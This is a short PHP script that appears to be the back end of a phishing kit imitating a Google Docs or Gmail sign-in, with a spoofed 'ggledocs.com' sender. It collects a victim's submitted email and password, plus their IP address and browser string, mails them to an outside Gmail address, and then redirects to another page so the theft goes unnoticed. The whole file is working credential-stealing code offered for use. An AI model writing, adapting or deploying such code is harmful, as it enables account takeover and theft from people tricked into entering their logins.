<?
$IP = getenv("REMOTE_ADDR");

$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "ID: ".$_POST['email']."\n";
$message .= "Pd: ".$_POST['password']."\n";
$message .= "IP: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="swintle9@gmail.com";

$subject = "Awake| Company grnail";
$headers = "From: OneDocment <NONE@ggledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: GG2.html");
?>